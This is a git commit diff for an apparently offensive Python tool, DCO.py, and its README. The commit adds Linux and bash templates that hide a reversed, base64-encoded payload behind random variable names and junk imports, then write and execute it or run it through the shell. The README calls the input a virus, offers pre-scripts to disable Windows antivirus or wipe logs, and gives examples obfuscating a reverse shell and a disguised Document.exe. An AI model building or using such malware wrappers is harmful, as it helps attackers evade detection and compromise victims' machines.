d81f5181a7acf7195eaa796b6b50533a58ab30ac
R00tendo <72181445+R00tendo@users.noreply.github.com>
2023-01-06 05:09:12 -0500

    0.31
    Added linux binary, bash support

--- DCO.py
+++ DCO.py
@@ -79,6 +79,70 @@ RANDOM_IMPORTS RANDOM_NEWLINES
 open("RANDOM_VAR0_NAME_HERE.exe", "wb").write(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1])) RANDOM_NEWLINES
 os.system("RANDOM_VAR0_NAME_HERE.exe") RANDOM_NEWLINES
             """]
+        class linux:
+            templates = ["""
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+open("RANDOM_VAR0_NAME_HERE", "wb").write(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1])) RANDOM_NEWLINES
+print(os.popen("chmod +x RANDOM_VAR0_NAME_HERE && ./RANDOM_VAR0_NAME_HERE").read()) RANDOM_NEWLINES
+            """,
+            """
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+RANDOM_VAR2_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]) RANDOM_NEWLINES
+open("RANDOM_VAR0_NAME_HERE", "wb").write(RANDOM_VAR2_NAME_HERE) RANDOM_NEWLINES
+os.popen("chmod +x RANDOM_VAR0_NAME_HERE && ./RANDOM_VAR0_NAME_HERE") RANDOM_NEWLINES
+            """,
+            """
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+RANDOM_VAR2_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]) RANDOM_NEWLINES
+open("RANDOM_VAR0_NAME_HERE", "wb").write(RANDOM_VAR2_NAME_HERE) RANDOM_NEWLINES
+os.system("chmod +x RANDOM_VAR0_NAME_HERE && ./RANDOM_VAR0_NAME_HERE") RANDOM_NEWLINES
+            """,
+            """
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+open("RANDOM_VAR0_NAME_HERE", "wb").write(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1])) RANDOM_NEWLINES
+os.system("chmod +x RANDOM_VAR0_NAME_HERE && ./RANDOM_VAR0_NAME_HERE") RANDOM_NEWLINES
+            """]
+    class bash:
+        templates = ["""
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_VAR0_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]).decode() RANDOM_NEWLINES
+RANDOM_VAR1_NAME_HERE = os.popen(RANDOM_VAR0_NAME_HERE).read() RANDOM_NEWLINES
+print(RANDOM_VAR1_NAME_HERE) RANDOM_NEWLINES
+        """,
+        """
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_VAR0_NAME_HERE = base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]).decode() RANDOM_NEWLINES
+os.system(RANDOM_VAR0_NAME_HERE) RANDOM_NEWLINES
+        """,
+        """
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+os.system(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]).decode()) RANDOM_NEWLINES
+        """,
+        """
+import os RANDOM_NEWLINES
+RANDOM_IMPORTS RANDOM_NEWLINES
+import base64 RANDOM_NEWLINES
+RANDOM_VAR1_NAME_HERE = os.popen(base64.b64decode('ENCODED_PAYLOAD_HERE'[::-1]).decode()).read() RANDOM_NEWLINES
+print(RANDOM_VAR1_NAME_HERE) RANDOM_NEWLINES
+        """,]
 
 
 def arg_check(args):
@@ -105,8 +169,9 @@ class obfuscate:
 
     def random_var():
         variable_name = ""
+        variable_name += random.choice(list("abcdefghijklmnopqrstuvwxyz"))
         charset = list("abcdefghijklmnopqrstuvwxyz1234567890")
-        length = random.randint(5,15)
+        length = random.randint(4,15)
         for cur in range(length):
             character = random.choice(charset)
             if character not in list("1234567890"):
@@ -141,32 +206,36 @@ import random""".split("\n")
             message.success("Template configured")
             return template
 
-    def windows():
-        if args.format == "python":
-            message.success("Using python templates")
-            template = random.choice(templates.python.universal.templates)
-            template = obfuscate.template_configure(template)
 
-        if args.format == "binary":
-            message.success("Using binary templates")
-            if args.os == "windows":
-                template = random.choice(templates.binary.windows.templates)
-                template = obfuscate.template_configure(template)
-        open(args.output_file, "w").write(template)
-        print(f"{t.blue}🏁----CODE-OBFUSCATED-SUCCESSFULLY----🏁")
 def main(args):
-    if args.os == "windows":
-        obfuscate.windows()
-    elif args.os == "linux":
-        obfuscate.linux()
+    if args.format == "python":
+        message.success("Using python templates")
+        template = random.choice(templates.python.universal.templates)
+        template = obfuscate.template_configure(template)
+    if args.format == "binary":
+        message.success("Using binary templates")
+        if args.os == "windows":
+            template = random.choice(templates.binary.windows.templates)
+            template = obfuscate.template_configure(template)
+        elif args.os == "linux":
+            template = random.choice(templates.binary.linux.templates)
+            template = obfuscate.template_configure(template)
+    if args.format == "bash":
+        if args.os == "windows":
+            messge.error("Bash format is only for linux systems")
+            sys.exit(1)
+        template = random.choice(templates.bash.templates)
+        template = obfuscate.template_configure(template)
+    open(args.output_file, "w").write(template)
+    print(f"{t.blue}🏁----CODE-OBFUSCATED-SUCCESSFULLY----🏁")
 
 if __name__ == "__main__":
     print(f"{t.green}{logo}{t.normal}")
     parser = argparse.ArgumentParser()
     parser.add_argument('-i', '--input-file', help="File you want to obfuscate.", required=True)
-    parser.add_argument('-f', '--format', help="What format the file is you want to obfuscate. (python, binary, bash) (only binary and python works currently)", required=True)
+    parser.add_argument('-f', '--format', help="What format the file is you want to obfuscate. (python, binary, bash)", required=True)
     parser.add_argument('-o', '--output-file', help="File where you want the obfuscated while to be written.", required=True)
-    parser.add_argument('--os', help="Operating system the obfuscated code will be ran in. (windows,linux) (only windows works currently)", required=True)
+    parser.add_argument('--os', help="Operating system the obfuscated code will be ran in. (windows,linux)", required=True)
     args = parser.parse_args()
     arg_check(args)
     main(args)
--- README.md
+++ README.md
@@ -12,15 +12,33 @@ python3 -m pip install -r requirements.txt
 python3 DCO.py -h
 ```
 
+
+## Usage
+```
+  -h, --help            show this help message and exit
+  -o OBFUSCATE, --obfuscate OBFUSCATE
+                        File to obfuscate.
+  -p PRE_SCRIPT, --pre-script PRE_SCRIPT
+                        Python script to run before executing the main virus
+                        (to for example disable windows av).
+  -f FORMAT, --format FORMAT
+                        What format is the target file (binary,python,bash)
+  --os OS               Target operating system.
+  --out OUT             Output obfuscated code to.
+
+```
+<a href="https://asciinema.org/a/512853" target="_blank"><img src="https://asciinema.org/a/512853.svg" width=500 heigth=500/></a>
+
 ## Example usage:
 ```
-python3 DCO.py -i Document.exe -f binary --os windows --out Document.py
-python3 DCO.py -i im_bad_at_naming.py --os windows --out install_ram.py
+python3 DCO.py -o reverse_shell.sh -f bash --out reverse_obf.py
+python3 DCO.py -o Document.exe -f binary -p disable_av.py --os windows --out Document.py
+python3 DCO.py -o im_bad_at_naming.py -p wipe_logs.py --out install_ram.py
 ```
 
 ## Supported formats:
 * ### python (executed in memory)
-* ### bash (executed in memory) UNDER WORK
-* ### binary (written to disk and executed) LINUX UNDER WORK
+* ### bash (executed in memory)
+* ### binary (written to disk and executed)
 
 #### Donate monero: 48ZrWwcf1gpG9VCe7agYru36SJhKwDDyGCgGw4TvkAG92Exd9pN7GBvL23SkwrMMbgdFa7BnFX2k6cD49SzV7pv42B4JDQE
